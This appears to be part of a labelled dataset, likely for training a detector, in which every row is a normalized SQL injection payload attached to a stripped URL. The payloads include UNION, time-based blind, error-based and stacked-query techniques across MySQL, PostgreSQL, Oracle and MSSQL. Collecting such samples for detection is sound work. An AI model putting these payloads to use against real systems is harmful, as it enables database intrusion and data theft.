,language,source
2074,sql,". . / ? = % "" and = ( select upper ( xmltype ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) from dual ) and " % " = " "
2075,sql,". . . / / / / ? = & = ) ) ; select dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) from dual --"
2076,sql,". . / / / ? = - ) ) order by -- "
2077,sql,". . . . / / / / ? = & = ' and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) -- "
2078,sql,". . ? = & = - "" ) ) union all select , , , , # "
2079,sql,". . / / ? = & = & = ' order by -- "
2080,sql,". . . / / / ? = & = "" ) ; ( select * from ( select ( sleep ( ) ) ) cxfv ) # "
2081,sql,". . . ? = & = ' rlike sleep ( ) and ' itzu ' = ' "
2082,sql,". . / / / ? = & = & = & = ' ) and ( select * from ( select ( sleep ( ) ) ) uygz ) and ( ' idni ' = ' "
2083,sql,". . . ? = & = & = & = ) ) ; select pg_sleep ( ) --"
2084,sql,". . . / / / ? = & = ' union all select null , null # "
2085,sql,". . / / / / ? = & = % ' ) ) and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) and ( ( ' % ' = ' "
2086,sql,". . / / / ? = ' ) ) ) union all select null , null , null -- "
2087,sql,". . . . / / / ? = & = ' ; select pg_sleep ( ) --"
2088,sql,". . / ? = & = ' and sleep ( ) and ' xmhl ' like ' "
2089,sql,". . . . / ? = & = & = "" ) ) union all select null , null , null , null , null -- "
2090,sql,". . ? = & = ) union all select null , null , null -- "
2091,sql,". . . / / / ? = & = & = & = "" ) ) ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) --"
2092,sql,". . / ? = & = ) ) and = % "
2093,sql,". . / / / / ? = ) and = and ( = "
2094,sql,". . / ? = ' waitfor delay ' : : ' -- "
2095,sql,". . . . / / / / ? = & = & = & = - ) union all select , , , , , -- "
2096,sql,". . / ? = ) order by # "
2097,sql,". . / / / ? = & = & = ) and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( = "
2098,sql,". . . / / / / ? = & = & = "" ) ; select sleep ( ) # "
2099,sql,". . . . / ? = & = ' ) ) ) rlike ( select ( case when ( = ) then else x end ) ) and ( ( ( ' zxlb ' = ' "
2100,sql,". . . . ? = & = & = , ( select from ( select row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) ) s ) "
2101,sql,". . . . / / ? = & = & = ' ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ' chxg ' like ' "
2102,sql,". . / / / ? = & = & = & = - "" union all select , -- "
2103,sql,". . . / / ? = & = union all select null , null , null , null , null , null , null , null , null , null # "
2104,sql,". . / ? = & = & = & = and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null # "
2105,sql,". . . . / / / / ? = & = & = "" ) and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and ( " rrzo " = " "
2106,sql,". . . . / / / / ? = & = & = ) ) and elt ( = , sleep ( ) ) and ( ( = "
2107,sql,". . . / ? = union all select null , null , null , null , null , null , null , null , null # "
2108,sql,". . / ? = and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) # "
2109,sql,". . ? = & = % ' union all select null # "
2110,sql,". . . . / / / / ? = & = & = & = - "" order by # "
2111,sql,". . . . / / ? = & = "" ) order by -- "
2112,sql,". . / / / ? = & = & = % "" and = % "
2113,sql,". . . . / / / / ? = & = ) ) union all select null , null , null # "
2114,sql,". . . . ? = & = & = % ' and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ' % ' = ' "
2115,sql,". . . ? = % ' ) ) and = % "
2116,sql,". . / / ? = & = & = % ' ) union all select null , null , null , null # "
2117,sql,". . / / ? = & = & = ' ) and = and ( ' aiso ' = ' "
2118,sql,". . ? = % ' ) ) and make_set ( = , ) and ( ( ' % ' = ' "
2119,sql,". . / / ? = - ' union all select , , , -- "
2120,sql,". . / / / / ? = & = & = ) ) ) union all select null -- "
2121,sql,". . . ? = & = ' , ( select ( case when ( = ) then else / ( select ) end ) ) -- "
2122,sql,". . . . ? = & = ' ) and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) and ( ' ofjm ' like ' "
2123,sql,". . . . ? = & = & = - ' order by -- "
2124,sql,". . . / / ? = & = & = ) and row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) -- "
2125,sql,". . / / / / ? = & = & = & = ) rlike ( select ( case when ( = ) then xcdfeecaffcdef else x end ) ) and ( = "
2126,sql,". . / / ? = union all select null , null , null , null , null -- "
2127,sql,". . . . / / ? = & = & = "" and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and " oxlt " = " "
2128,sql,". . . . / / / / ? = ) and row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) and ( = "
2129,sql,". . . . / ? = & = & = & = "" ) union all select null , null , null , null , null , null , null # "
2130,sql,". . . . / ? = & = - ' ) union all select , , , , , , , , # "
2131,sql,". . . . / ? = & = & = & = - ' union all select , , , # "
2132,sql,". . . / / / / ? = & = "" ) union all select null , null , null , null , null # "
2133,sql,". . . / / / / ? = & = & = - "" union all select , -- "
2134,sql,". . . . / / / ? = & = & = - % "" union all select , , , , , -- "
2135,sql,". . . . / ? = & = "" ) ) and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and ( ( " zynk " = " "
2136,sql,". . . . / / ? = ) ) ; if ( = ) select else drop function eufa --"
2137,sql,". . / / / ? = & = & = & = "" union all select null , null , null , null , null , null , null , null # "
2138,sql,". . / ? = ' ) ) ) union all select null , null , null , null , null , null , null , null , null , null -- "
2139,sql,". . . . / / / ? = & = & = & = - union all select , , , , , , , , , # "
2140,sql,". . . / ? = & = & = & = union all select null , null , null , null , null , null , null , null -- "
2141,sql,". . . / ? = & = & = ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( = "
2142,sql,". . . . / / / ? = & = & = and = "
2143,sql,". . / / / ? = & = & = & = ' ) and ( select * from ( select ( sleep ( ) ) ) pjbf ) # "
2144,sql,". . . ? = & = & = & = - % "" union all select , , # "
2145,sql,". . / / / / ? = & = - ' order by # "
2146,sql,". . ? = & = & = union all select null , null , null , null , null -- "
2147,sql,". . ? = & = & = & = "" and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and " eizt " like " "
2148,sql,". . . / / / / ? = & = & = & = ' ) and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ( ' eslo ' = ' "
2149,sql,". . / ? = & = & = ) ) union all select null , null , null , null , null , null , null , null , null , null # "
2150,sql,". . . / / / / ? = & = & = "" rlike ( select ( case when ( = ) then xaffdedeafffe else x end ) ) and " oukp " = " "
2151,sql,". . . . ? = ' ) and = -- "
2152,sql,". . . / / / ? = & = & = & = ) and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) -- "
2153,sql,". . . / / / ? = % "" union all select null , null , null , null # "
2154,sql,". . . / / / / ? = & = % ' ) ) and = % "
2155,sql,". . / / / ? = & = & = & = and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) "
2156,sql,". . . / / ? = & = - % ' ) union all select , , , , , , , # "
2157,sql,". . / / / / ? = % ' ) procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) and ( ' % ' = ' "
2158,sql,". . . / / / ? = & = - ' ) ) ) union all select , , , , , -- "
2159,sql,". . / / / ? = & = - ) union all select , , , , , -- "
2160,sql,". . / / ? = & = and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null -- "
2161,sql,". . ? = & = & = - ) ) order by # "
2162,sql,". . / / ? = & = & = - union all select , , , -- "
2163,sql,". . / / / / ? = & = & = & = % "" and elt ( = , sleep ( ) ) and " % " = " "
2164,sql,". . / ? = & = & = & = ' ) ) and sleep ( ) and ( ( ' ewzk ' like ' "
2165,sql,". . . . ? = & = & = ' ; waitfor delay ' : : ' --"
2166,sql,". . / / / ? = ' and = # "
2167,sql,". . / / / ? = "" and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and " gfmz " = " "
2168,sql,". . . . / ? = & = - ) union all select , , , -- "
2169,sql,". . / ? = & = - ) union all select , , -- "
2170,sql,". . / / ? = & = & = & = % ' ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ' % ' = ' "
2171,sql,". . . / / / ? = & = & = "" and = ( select upper ( xmltype ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) from dual ) and " pzqb " = " "
2172,sql,". . . . / / ? = & = & = & = union all select null -- "
2173,sql,". . . ? = & = % ' and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ' % ' = ' "
2174,sql,". . . ? = & = & = & = "" union all select null , null , null , null , null , null # "
2175,sql,". . / / / / ? = ' union all select null , null , null , null , null , null , null , null # "
2176,sql,". . . . / / ? = & = & = & = - ' union all select , , , , , , , , # "
2177,sql,". . . . / / / / ? = & = & = "" ) rlike ( select ( case when ( = ) then xaffdedeafffe else x end ) ) and ( " ayzs " = " "
2178,sql,". . . / ? = & = & = & = - ) union all select # "
2179,sql,". . . . ? = ) ) ) and make_set ( = , ) and ( ( ( = "
2180,sql,". . . / ? = "" union all select null , null , null , null , null , null , null # "
2181,sql,". . . / / / ? = & = & = % ' ) ) and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( ( ' % ' = ' "
2182,sql,". . . . / / / ? = & = "" and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and " cuhl " = " "
2183,sql,". . / ? = & = & = % ' ) and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and ( ' % ' = ' "
2184,sql,". . . . ? = & = & = % ' ) ) and = and ( ( ' % ' = ' "
2185,sql,". . . ? = & = "" and elt ( = , sleep ( ) ) and " svjk " = " "
2186,sql,". . . / / / ? = ' , ( select ( case when ( = ) then else * ( select from information_schema . plugins ) end ) ) -- "
2187,sql,". . . / / ? = & = union all select null -- "
2188,sql,". . . . / / ? = & = ' ) order by -- "
2189,sql,". . . . / ? = & = & = ' ) ) ; select pg_sleep ( ) --"
2190,sql,". . ? = ) ) and = % "
2191,sql,". . . . / / / / ? = & = & = ' ) ) union all select null , null , null , null , null , null , null , null , null , null -- "
2192,sql,". . . . / ? = ' ) ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( ( ' mvyi ' like ' "
2193,sql,". . . . / / ? = % ' ) ) and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ( ( ' % ' = ' "
2194,sql,". . . . ? = & = & = ' union all select null , null , null , null # "
2195,sql,". . ? = & = and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) -- "
2196,sql,". . . . / / ? = & = & = & = ' and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) -- "
2197,sql,". . . . / / / ? = - union all select , , , , , , , , , # "
2198,sql,". . . / ? = & = & = & = "" ) ) and ( select * from ( select ( sleep ( ) ) ) ejit ) # "
2199,sql,". . . . / / / ? = ' , ( select ( case when ( = ) then else * ( select from information_schema . plugins ) end ) ) -- "
2200,sql,". . / ? = & = & = & = rlike ( select ( case when ( = ) then else x end ) ) # "
2201,sql,". . / ? = & = & = & = ' ) ) union all select null , null , null , null , null , null # "
2202,sql,". . . . / / / ? = ' ) ) and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) and ( ( ' plzw ' = ' "
2203,sql,". . / / / ? = & = & = & = ) ) and = and ( ( = "
2204,sql,". . . / / ? = % ' ) ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) --"
2205,sql,". . . . / / / ? = & = "" ) union all select null , null , null , null , null , null , null , null , null # "
2206,sql,". . / / / / ? = & = "" ) ) and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ( ( " pewj " = " "
2207,sql,". . . / / / ? = & = & = & = ' ) ) ) and = % "
2208,sql,". . . . ? = & = "" union all select null , null , null , null # "
2209,sql,". . . / ? = & = & = - ' ) ) union all select , , , -- "
2210,sql,". . . . / / / ? = & = & = ' ) union all select null , null , null , null , null , null , null , null , null # "
2211,sql,". . . / ? = - ) union all select , , , , , , -- "
2212,sql,". . . ? = & = ' ) ) and = % "
2213,sql,". . / / / ? = & = % ' ) ) procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) and ( ( ' % ' = ' "
2214,sql,". . . . / / ? = & = & = % ' ) ) order by # "
2215,sql,". . ? = & = "" and = -- "
2216,sql,". . . / / / / ? = ' union all select null , null , null , null , null , null , null # "
2217,sql,". . . / ? = & = & = - order by # "
2218,sql,". . / ? = & = and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null # "
2219,sql,". . . / / ? = & = - "" union all select , , , -- "
2220,sql,". . . / / / / ? = & = & = - union all select , , # "
2221,sql,". . . . / ? = & = & = % ' union all select null , null # "
2222,sql,". . . . / / ? = "" ) and make_set ( = , ) and ( " aepr " = " "
2223,sql,". . . . / / ? = & = & = & = % ' ) ) ; ( select * from ( select ( sleep ( ) ) ) cxfv ) # "
2224,sql,". . / / ? = & = & = ) and row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) -- "
2225,sql,". . . / / / / ? = & = ' ) ) ) union all select null , null , null , null , null , null , null , null -- "
2226,sql,". . . / / ? = & = & = "" ) waitfor delay ' : : ' and ( " bqdq " = " "
2227,sql,". . / ? = & = & = ' ) ) ) union all select null , null # "
2228,sql,". . . / / / / ? = & = & = . "
2229,sql,". . . / ? = & = & = & = - ' ) union all select , , , , , , , # "
2230,sql,". . . . / / / ? = & = & = & = and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) -- "
2231,sql,". . ? = % ' ) ) ; if ( = ) select else drop function rpwm --"
2232,sql,". . . . / / ? = & = & = & = "" ) ) union all select null , null , null , null , null , null , null , null , null # "
2233,sql,". . / ? = & = ' ) ; waitfor delay ' : : ' --"
2234,sql,". . . . / / ? = & = & = procedure analyse ( extractvalue ( , concat ( xc , x , ( select ( case when ( = ) then else end ) ) , xba ) ) , ) -- "
2235,sql,". . . . / ? = & = ' and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and ' oprg ' = ' "
2236,sql,". . / / ? = & = - ' union all select -- "
